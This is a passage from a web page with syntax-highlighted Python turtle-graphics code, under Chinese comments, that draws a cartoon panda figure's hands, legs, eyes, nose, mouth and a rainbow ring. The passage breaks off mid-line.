operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre></pre></td></tr><tr><td data-num="108"></td><td><pre><span class="token comment"># 右手内</span></pre></td></tr><tr><td data-num="109"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="113"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="117"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="118"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="119"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token comment"># 左腿内</span></pre></td></tr><tr><td data-num="123"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">168</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="128"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="129"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="130"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="131"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="134"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="136"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="137"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="138"></td><td><pre><span class="token comment"># 右腿内</span></pre></td></tr><tr><td data-num="139"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="140"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">210</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="141"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="142"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="143"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="144"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">155</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="145"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="148"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="149"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="150"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="152"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="153"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="154"></td><td><pre></pre></td></tr><tr><td data-num="155"></td><td><pre><span class="token comment"># 右眼</span></pre></td></tr><tr><td data-num="156"></td><td><pre><span class="token comment"># 眼圈</span></pre></td></tr><tr><td data-num="157"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="158"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="159"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="160"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="161"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="162"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="163"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="164"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="165"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="166"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre><span class="token comment"># 眼珠</span></pre></td></tr><tr><td data-num="168"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="169"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="170"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="171"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="172"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="173"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="174"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="175"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="176"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="177"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="178"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="179"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="180"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="181"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="182"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="183"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="184"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="185"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="186"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="187"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="188"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="189"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="190"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="191"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="192"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="193"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="194"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="195"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="196"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="197"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="198"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="199"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="200"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="201"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="202"></td><td><pre></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token comment"># 左眼</span></pre></td></tr><tr><td data-num="204"></td><td><pre><span class="token comment"># 眼圈</span></pre></td></tr><tr><td data-num="205"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="206"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="207"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="208"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="209"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="210"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="211"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="212"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="213"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="214"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="215"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="216"></td><td><pre><span class="token comment"># 眼珠</span></pre></td></tr><tr><td data-num="217"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="218"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="219"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="220"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="221"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="222"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="223"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="224"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="225"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="226"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="227"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="228"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="229"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="230"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="231"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="232"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="233"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="234"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="235"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="236"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="237"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="238"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="239"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="240"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="241"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="242"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="243"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="244"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="245"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="246"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="247"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="248"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="249"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="250"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="251"></td><td><pre></pre></td></tr><tr><td data-num="252"></td><td><pre><span class="token comment"># 鼻子</span></pre></td></tr><tr><td data-num="253"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="254"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="255"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="256"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="257"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="258"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="259"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="260"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="261"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="262"></td><td><pre></pre></td></tr><tr><td data-num="263"></td><td><pre><span class="token comment"># 嘴</span></pre></td></tr><tr><td data-num="264"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="265"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="266"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="267"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="268"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="269"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="270"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">132</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="271"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="272"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="273"></td><td><pre></pre></td></tr><tr><td data-num="274"></td><td><pre><span class="token comment"># 彩虹圈</span></pre></td></tr><tr><td data-num="275"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="276"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="277"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="278"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"cyan"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="279"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token 